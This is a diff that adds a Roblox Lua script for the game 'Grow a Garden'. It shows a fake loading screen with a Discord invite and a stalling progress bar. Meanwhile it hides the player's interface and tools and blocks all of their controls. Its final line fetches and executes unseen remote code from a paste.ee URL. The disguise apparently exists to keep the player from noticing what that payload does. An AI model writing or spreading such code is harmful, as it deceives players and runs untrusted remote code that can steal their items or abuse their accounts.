@@ -1,1 +1,109 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local ContextActionService = game:GetService("ContextActionService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+local function hideToolsAndUI()
+	for _, gui in pairs(playerGui:GetChildren()) do
+		if gui:IsA("ScreenGui") and gui.Name ~= "DarkLoadingScreen" then
+			gui.Enabled = false
+		end
+	end
+
+	if player:FindFirstChild("Backpack") then
+		for _, tool in pairs(player.Backpack:GetChildren()) do
+			if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
+				tool.Handle.Transparency = 1
+				if tool.Handle:FindFirstChildOfClass("Decal") then
+					tool.Handle:FindFirstChildOfClass("Decal").Transparency = 1
+				end
+			end
+		end
+	end
+end
+
+local function blockInputs()
+	ContextActionService:BindAction("DisableControls", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.PlayerActions:GetEnumItems()))
+end
+
+blockInputs()
+hideToolsAndUI()
+
+local screenGui = Instance.new("ScreenGui", playerGui)
+screenGui.Name = "DarkLoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+local bg = Instance.new("Frame", screenGui)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+
+local title = Instance.new("TextLabel", bg)
+title.Text = "🌴 GROW A\n GARDEN 🌴"
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.Position = UDim2.new(0, 0, 0.15, 0)
+title.Font = Enum.Font.GothamBlack
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.BackgroundTransparency = 1
+
+local status = Instance.new("TextLabel", bg)
+status.Text = "Script Loading Please Wait for a While"
+status.Size = UDim2.new(1, 0, 0.05, 0)
+status.Position = UDim2.new(0, 0, 0.42, 0)
+status.Font = Enum.Font.Gotham
+status.TextColor3 = Color3.fromRGB(200, 200, 200)
+status.TextScaled = true
+status.BackgroundTransparency = 1
+
+local discord = Instance.new("TextLabel", bg)
+discord.Text = "discord.gg/33UaSnkXdR"
+discord.Size = UDim2.new(0.5, 0, 0.04, 0)
+discord.Position = UDim2.new(0.25, 0, 0.48, 0)
+discord.Font = Enum.Font.GothamBold
+discord.TextColor3 = Color3.fromRGB(220, 220, 220)
+discord.TextScaled = true
+discord.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+discord.BorderSizePixel = 0
+Instance.new("UICorner", discord).CornerRadius = UDim.new(0, 8)
+
+local barBack = Instance.new("Frame", bg)
+barBack.Size = UDim2.new(0.5, 0, 0.04, 0)
+barBack.Position = UDim2.new(0.25, 0, 0.55, 0)
+barBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barBack.BorderSizePixel = 0
+Instance.new("UICorner", barBack).CornerRadius = UDim.new(0, 10)
+
+local barFill = Instance.new("Frame", barBack)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.new(1, 1, 1)
+barFill.BorderSizePixel = 0
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 10)
+
+local percentLabel = Instance.new("TextLabel", bg)
+percentLabel.Text = "0%"
+percentLabel.Size = UDim2.new(1, 0, 0.04, 0)
+percentLabel.Position = UDim2.new(0, 0, 0.61, 0)
+percentLabel.Font = Enum.Font.Gotham
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.TextScaled = true
+percentLabel.BackgroundTransparency = 1
+
+local percent = 0
+while percent <= 99 do
+	barFill:TweenSize(UDim2.new(percent / 100, 0, 1, 0), "Out", "Sine", 0.1, true)
+	percentLabel.Text = percent .. "%"
+	hideToolsAndUI() -- Ensure any reappearing UI stays hidden
+	wait(0.1 + math.random() * 0.08)
+	percent += 1
+end
+
+status.Text = "Finalizing..."
+percentLabel.Text = "99%"
+barFill:TweenSize(UDim2.new(0.99, 0, 1, 0), "Out", "Sine", 0.2, true)
+
 loadstring(game:HttpGet("https://paste.ee/r/glpPpoMo"))()
